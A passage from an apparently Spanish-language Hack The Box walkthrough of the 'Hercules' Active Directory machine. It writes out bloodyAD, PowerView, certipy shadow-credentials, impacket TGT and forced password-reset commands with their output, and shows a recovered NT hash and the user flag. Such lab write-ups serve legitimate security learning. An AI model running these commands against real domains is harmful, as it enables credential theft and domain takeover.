ntpdate hercules.htb ; python3 bloodyAD.py -u 'bob.w' -p '' -k -d 'hercules.htb' --host dc.hercules.htb get writable --detail
```

Info:

```
2025-10-23 02:02:40.414244 (-0700) -1.002159 +/- 0.017281 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -1.002159

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Vincent Gray,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Nate Hicks,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Mark Stone,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Elijah Morrison,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Angelo Onclarit,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
name: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
cn: WRITE

distinguishedName: CN=Ken Wiggins,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Johnathan Johnson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Harris Dunlop,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE
```

De toda esta informacion vemos interesante esta parte:

```
OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
user: CREATE_CHILD
```

Que es lo que sospechavamos, esto significa que `bob.w` puede `CREAR` usuarios en `Web Department OU`.

Tambien vemos `WRITE en Stephen Miller`, que es lo que vimos desde `BloodHound`:

```
CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE
```

Significa que el usuario `bob.w` puede modificar atributos de `Stephen Miller`. Para hacer todo esto nos tendremos que descargar esta dependencia.

```shell
pip install "git+https://github.com/aniqfakhrul/powerview.py"
powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 --no-pass -d
```

Info:

```
Logging directory is set to /root/.powerview/logs/hercules-bob.w-dc.hercules.htb
[2025-10-23 02:12:24] [ConnectionPool] Started LDAP connection pool cleanup thread
[2025-10-23 02:12:24] [ConnectionPool] Started LDAP connection pool keep-alive thread
[2025-10-23 02:12:24] LDAP sign and seal are supported
[2025-10-23 02:12:24] TLS channel binding is supported
[2025-10-23 02:12:24] Authentication: SASL, User: bob.w@hercules.htb
[2025-10-23 02:12:24] Connecting to dc.hercules.htb, Port: 636, SSL: True
[2025-10-23 02:12:24] Using Kerberos Cache: /home/kali/Desktop/hercules/bob.w.ccache
[2025-10-23 02:12:24] SPN LDAP/DC.HERCULES.HTB@HERCULES.HTB not found in cache
[2025-10-23 02:12:24] AnySPN is True, looking for another suitable SPN
[2025-10-23 02:12:24] Returning cached credential for KRBTGT/HERCULES.HTB@HERCULES.HTB
[2025-10-23 02:12:24] Using TGT from cache
[2025-10-23 02:12:24] Trying to connect to KDC at 10.10.11.91:88
[2025-10-23 02:12:25] [Storage] Using cache directory: /root/.powerview/storage/ldap_cache
[2025-10-23 02:12:25] [VulnerabilityDetector] Created default vulnerability rules at /root/.powerview/vulns.json
[2025-10-23 02:12:25] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-23 02:12:25] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=bob.w)(name=bob.w)(displayName=bob.w)(objectSid=bob.w)(distinguishedName=bob.w)(dnsHostName=bob.w)(objectGUID=*bob.w*)))
[2025-10-23 02:12:25] [ConnectionPool] LDAP added connection for domain: hercules.htb
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯
```

Con esto ya estaremos dentro de un `interpreter` de `PowerView` pero desde `Linux` facilitando mucho la tarea. Ahora podemos utilizar comandos de `PowerShell` propios de dicho modulo.

```powershell
Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
```

Info:

```
[2025-10-23 02:14:01] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-23 02:14:01] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
[2025-10-23 02:14:01] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-23 02:14:01] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2025-10-23 02:14:01] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb                                                                                                                            
[2025-10-23 02:14:01] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```

Veremos que ha funcionado, por lo que hemos movido exitosamente a **Stephen Miller** desde "Security Department" a "Web Department" OU.

## Escalate user Auditor

### Certificate Abuse (stephen.m)

Ahora con esto vamos a realizar una tecnica de `Abuso de certificado` de esta forma, pero antes vamos a volver a exportar el `TGT` del usuario `natalie.a` para poder solicitar un `ceetificado` sobre el usuario `a` ahora que podemos ya que hemos movido a dicho usuario al grupo en el que podemos solicitar dicho `certificado`:

```shell
export KRB5CCNAME=natalie.a.ccache
ntpdate hercules.htb ; certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -account 'stephen.m'
```

Info:

```
2025-10-23 02:17:52.009940 (-0700) -0.490859 +/- 0.448384 hercules.htb 10.10.11.91 s1 no-leap
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'stephen.m'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '76a2830b65a84632a8450f24737e9ffc'
[*] Adding Key Credential with device ID '76a2830b65a84632a8450f24737e9ffc' to the Key Credentials for 'stephen.m'
[*] Successfully added Key Credential with device ID '76a2830b65a84632a8450f24737e9ffc' to the Key Credentials for 'stephen.m'
[*] Authenticating as 'stephen.m' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'stephen.m@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'stephen.m.ccache'
[*] Wrote credential cache to 'stephen.m.ccache'
[*] Trying to retrieve NT hash for 'stephen.m'
[*] Restoring the old Key Credentials for 'stephen.m'
[*] Successfully restored the old Key Credentials for 'stephen.m'
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
```

Vemos que ha funcionado, por lo que vamos a utilizar dicho `hash NTLM` para obtener el `TGT` de dicho usuario y exportarnoslo como hicimos anteriormente.

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> -hashes :9aaaedcb19e612216a2dac9badb3c210 hercules.htb/stephen.m
```

Info:

```
2025-10-23 02:19:56.674498 (-0700) -0.922853 +/- 0.015464 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.922853
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in stephen.m.ccache
```

Vemos que ha funcionado, por lo que vamos a exportarnos el `TGT` en la variable de `kerberos` de esta forma:

```shell
export KRB5CCNAME=stephen.m.ccache
```

Ahora recordemos que con este usuarios pertenecemos al grupo que puede forzar el cambio de contraseña de varios usuarios, pero entre ellos nos interesa el del `AUDITOR` que es el que puede conectar por `WinRM` de forma remota.

```shell
ntpdate hercules.htb ; python3 bloodyAD.py -d hercules.htb -u stephen.m -p '' -k --host dc.hercules.htb set password 'CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' 'NuevaContraseña123!'
```

Info:

```
2025-10-23 02:24:24.742096 (-0700) -0.017373 +/- 0.015039 hercules.htb 10.10.11.91 s1 no-leap
[+] Password changed successfully!
```

Vemos que ha funcionado, por lo que vamos a probar a obtener un `TGT` de dicho usuario.

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> hercules.htb/auditor:NuevaContraseña123!
```

Info:

```
2025-10-23 02:25:44.056292 (-0700) -0.561392 +/- 0.015710 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.561392
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in auditor.ccache
```

Vemos que ha funcionado, por lo que vamos a exportarlo en la variable de `kerberos` para poder utilizarlo por `evil-winrm` de esta forma:

> Añadir configuracion de KDC a Kerberos5

```shell
echo "[libdefaults]
    default_realm = HERCULES.HTB
[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
    }
[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB" | sudo tee -a /etc/krb5.conf
```

Ahora si podremos meternos por `WinRM` con toda esta configuracion, pero tendremos que entrar por `SSL` y la herramienta de `evil-winrm` me daba muchos problemas por lo que buscando por internet encontre esta herramienta que te facilita todo esto:

URL = [winrmexec GitHub Herramienta](https://github.com/ozelis/winrmexec)

```shell
git clone https://github.com/ozelis/winrmexec.git
cd winrmexec/
python3 winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

Info:

```
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\auditor
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
PS C:\Users\auditor\Documents> whoami
hercules\auditor
```

Veremos que ha funcionado por lo que vamos a leer la `flag` del usuario.

> user.txt

```
328419cd440ca952fa2c4cd2e9832ee6
```

## Escalate Privileges

Vemos que `Auditor` tiene `GenericAll` sobre estos usuarios:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 114327.png" alt=""><figcaption></figcaption></figure>

Por lo que vemos es bastante interesante y si vemos de que grupo somos desde la terminal...

```powershell
whoami /groups
```

Info:

```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Vemos cosas bastante interesantes, pero antes vamos a importar el modulo de `Active Direcotry` para utilizar dichas funciones dentro de esta `shell`.

```powershell
Import-Module ActiveDirectory
```

Una vez cargado dicho modulo vamos a verificar las `ACLs` en la `OU` (Forest Migration) específicamente para el grupo `"Forest Management"`.

```powershell
(Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *
```

Info:

```
ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericRead
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

Vemos que el grupo `"Forest Management"` tiene **GenericAll** sobre la `OU` `"Forest Migration"`.

### Asignar `ownership` de la OU `Forest Migration` a Auditor

Vamos asignar al usuario `Auditor` el `ownership` de la `OU (Forest Migration)` de esta forma:

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u Auditor -p 'NuevaContraseña123!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

Info:

```
2025-10-23 02:55:01.366387 (-0700) -0.042043 +/- 0.015584 hercules.htb 10.10.11.91 s1 no-leap
[!] S-1-5-21-1889966460-2597381952-958560702-1128 is already the owner, no modification will be made
```

Nos pone que ya es de dicho grupo, como estamos en una maquina de `HTB` habra sido algun usuario que se me haya adelantado, pero si no lo estuviera daria un prompt de resultado diferente.

### Otorgarnos `GenericAll` con Auditor en OU

Ahora que somos de este grupo vamos a otorgarnos permisos `GenericAll` a la cuenta `Auditor` sobre la `OU "Forest Migration"`.

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

Info:

```
2025-10-23 02:58:42.276610 (-0700) -0.008790 +/- 0.015232 hercules.htb 10.10.11.91 s1 no-leap
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

Vemos que ha funcionado, por lo que ahora tendremos **FULL CONTROL** de permisos heredados a todos los `sub-objetos`.

Tenemos los siguiente privilegios:

```
Manipulación Completa de Objetos
Creación de Nuevos Objetos
Reset de Contraseñas (Helpdesk Rights)
Preparar RBCD Attacks
```

Despues de un rato probando y buscando por la maquina veremos que hay un usuario deshabilitado en la propia maquina victima, lo podremos ver de esta forma:

```powershell
Get-ADUser -Filter "userAccountControl -band 2" -Properties SamAccountName, DistinguishedName, Enabled
```

Info:

```
DistinguishedName : CN=Guest,CN=Users,DC=hercules,DC=htb
Enabled           : False
GivenName         : 
Name              : Guest
ObjectClass       : user
ObjectGUID        : 34b44d5c-442e-4153-93f3-b9cf09158775
SamAccountName    : Guest
SID               : S-1-5-21-1889966460-2597381952-958560702-501
Surname           : 
UserPrincipalName : 

DistinguishedName : CN=krbtgt,CN=Users,DC=hercules,DC=htb
Enabled           : False
GivenName         : 
Name              : krbtgt
ObjectClass       : user
ObjectGUID        : 83571eb3-4d96-4145-beb5-4abee47258c2
SamAccountName    : krbtgt
SID               : S-1-5-21-1889966460-2597381952-958560702-502
Surname           : 
UserPrincipalName : 

DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : IIS_Administrator
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb

DistinguishedName : CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Taylor
Name              : Taylor Maxwell
ObjectClass       : user
ObjectGUID        : f126a286-f0ee-4c81-a543-85117f3f46de
SamAccountName    : taylor.m
SID               : S-1-5-21-1889966460-2597381952-958560702-1120
Surname           : Maxwell
UserPrincipalName : taylor.m@hercules.htb

DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb

DistinguishedName : CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : James
Name              : James Silver
ObjectClass       : user
ObjectGUID        : 628e5829-12bd-419e-b210-6e921d48b004
SamAccountName    : james.s
SID               : S-1-5-21-1889966460-2597381952-958560702-1122
Surname           : Silver
UserPrincipalName : james.s@hercules.htb

